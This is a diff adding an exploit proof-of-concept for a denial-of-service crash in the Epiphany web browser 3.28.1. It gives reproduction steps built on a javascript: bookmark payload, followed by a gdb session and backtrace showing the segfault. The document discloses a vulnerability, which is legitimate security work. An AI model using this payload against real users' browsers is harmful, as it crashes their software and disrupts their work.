@@ -1,0 +1,84 @@
+# Exploit Title: Epiphany Web Browser 3.28.1 - Denial of Service (PoC)
+# Author: Dhiraj Mishra
+# Date: 2018-08-23
+# Software: https://projects-old.gnome.org/epiphany/
+# Version: 3.28.1
+# CVE: N/A
+# Tested on: Ubuntu 18 64bit
+
+# Steps to reproduce:
+1. Open epiphany browser
+2. Bookmark any random page
+3. Then navigate to bookmark properties set:
+    Name = Crash
+    Address = javascript:window.open('javascript:document.write("<script></script>");');
+4. Browser any URL's and try to open the above bookmark
+5. The browser crashes
+
+# Below backtrace for your reference.
+
+$ gdb epiphany
+GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from epiphany...(no debugging symbols found)...done.
+(gdb) r
+Starting program: /usr/bin/epiphany 
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+[New Thread 0x7fffe08b6700 (LWP 9295)]
+[New Thread 0x7fffdee4b700 (LWP 9296)]
+[New Thread 0x7fffde64a700 (LWP 9297)]
+[New Thread 0x7fffdcdcf700 (LWP 9298)]
+[New Thread 0x7fff8fffd700 (LWP 9299)]
+[New Thread 0x7fff8f7fc700 (LWP 9300)]
+[New Thread 0x7fff8effb700 (LWP 9301)]
+[New Thread 0x7fff8e38b700 (LWP 9302)]
+[New Thread 0x7fff8db8a700 (LWP 9303)]
+[New Thread 0x7fff8d389700 (LWP 9305)]
+[New Thread 0x7fff77b0a700 (LWP 9310)]
+[New Thread 0x7fff7598c700 (LWP 9320)]
+[New Thread 0x7fff7518b700 (LWP 9321)]
+[New Thread 0x7fff7498a700 (LWP 9327)]
+[New Thread 0x7fff7698c700 (LWP 9334)]
+[New Thread 0x7fff5ffff700 (LWP 9335)]
+[New Thread 0x7fff5f7fe700 (LWP 9336)]
+[New Thread 0x7fff5effd700 (LWP 9337)]
+[New Thread 0x7fff5e7fc700 (LWP 9338)]
+[New Thread 0x7fff5dffb700 (LWP 9339)]
+[Thread 0x7fff8db8a700 (LWP 9303) exited]
+[Thread 0x7fff8e38b700 (LWP 9302) exited]
+[Thread 0x7fff5e7fc700 (LWP 9338) exited]
+[Thread 0x7fff7698c700 (LWP 9334) exited]
+[Thread 0x7fff5f7fe700 (LWP 9336) exited]
+[Thread 0x7fff5effd700 (LWP 9337) exited]
+[Thread 0x7fff5dffb700 (LWP 9339) exited]
+[Thread 0x7fff5ffff700 (LWP 9335) exited]
+Error scanning plugin /usr/lib/mozilla/plugins/libpepflashplayer.so, /usr/lib/x86_64-linux-gnu/webkit2gtk-4.0/WebKitPluginProcess returned 256 exit status
+[New Thread 0x7fff5ffff700 (LWP 9399)]
+[Thread 0x7fff7498a700 (LWP 9327) exited]
+[New Thread 0x7fff7498a700 (LWP 9402)]
+[Thread 0x7fff7498a700 (LWP 9402) exited]
+
+Thread 22 "pool" received signal SIGSEGV, Segmentation fault.
+[Switching to Thread 0x7fff5ffff700 (LWP 9399)]
+0x00007ffff7b75db7 in ?? () from /usr/lib/x86_64-linux-gnu/epiphany-browser/libephymain.so
+(gdb) bt
+#0  0x00007ffff7b75db7 in  () at /usr/lib/x86_64-linux-gnu/epiphany-browser/libephymain.so
+#1  0x00007ffff7079be6 in  () at /usr/lib/x86_64-linux-gnu/libgio-2.0.so.0
+#2  0x00007ffff73fe7d0 in  () at /usr/lib/x86_64-linux-gnu/libglib-2.0.so.0
+#3  0x00007ffff73fde05 in  () at /usr/lib/x86_64-linux-gnu/libglib-2.0.so.0
+#4  0x00007fffefc206db in start_thread (arg=0x7fff5ffff700) at pthread_create.c:463
+#5  0x00007ffff5e4c88f in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:95
+(gdb)
